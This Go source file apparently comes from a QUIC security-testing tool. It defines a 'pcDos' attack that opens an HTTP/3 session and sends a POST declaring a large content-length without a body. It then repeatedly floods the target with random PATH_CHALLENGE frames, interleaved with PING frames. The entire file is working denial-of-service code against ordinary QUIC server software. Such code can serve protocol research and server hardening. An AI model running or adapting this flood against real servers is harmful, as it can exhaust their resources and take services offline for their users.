package main

import (
	"bytes"
	"crypto/rand"
	"strconv"
	"time"

	"github.com/k4ra5u/quic-go/internal/wire"
)

type pcDos struct {
	BaseArgs
}

func (pcDos *pcDos) Attack() (response *HTTPMessage, err error) {
	session, cancel, err := pcDos.Make_one_session()
	defer func() {
		_ = session.CloseWithError(0, "")
		cancel()
	}()

	requestStream, err := session.OpenStream()
	if err != nil {
		return nil, err
	}
	request := &HTTPMessage{
		Headers: []Header{
			{":method", "POST"},
			{":path", "/index.html"},
			{":authority", pcDos.targetHost},
			{":scheme", "https"},
			{"user-agent", "Mozilla/5.0"},
		},
		Body: nil,
	}
	firstRange := bytes.NewBuffer(nil)
	requestHeaders := request.Headers
	requestHeaders = append(requestHeaders, Header{
		Name:  "content-length",
		Value: strconv.Itoa(138041),
	})
	firstRange.Write(encodeHeaders(requestHeaders))
	//firstRange.Write(bytes.Repeat([]byte("A"), flushSize-1))

	_, _ = requestStream.Write(firstRange.Bytes())
	time.Sleep(time.Millisecond * 50)

	randomBytes := make([]byte, 8)

	ping_frame := &wire.PingFrame{}
	pingFrame := []wire.Frame{
		ping_frame,
	}
	connIDgen := session.GetConnIDGenerator()
	connIDgen.AddCID(0)

	time.Sleep(time.Millisecond * 10)
	for i := 0; uint64(i) < pcDos.repeatTimes; i++ {
		if i%100 == 0 && i != 0 {
			requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(pingFrame)
			time.Sleep(time.Millisecond * 100)
		}
		rand.Read(randomBytes)
		var randomBytesArray [8]byte
		copy(randomBytesArray[:], randomBytes)
		//padding := []byte(bytes.Repeat([]byte("\x00"), 1172))
		padding := []byte("")

		path_challengeFrame := &wire.PathChallengeFrame{
			Data:    randomBytesArray,
			Padding: padding,
		}
		path_challenge_frame := []wire.Frame{
			path_challengeFrame,
		}
		requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(path_challenge_frame)
		time.Sleep(time.Millisecond * 100)
	}

	time.Sleep(time.Second * 1)
	//time.Sleep(time.Millisecond * 500)
	return nil, nil

}
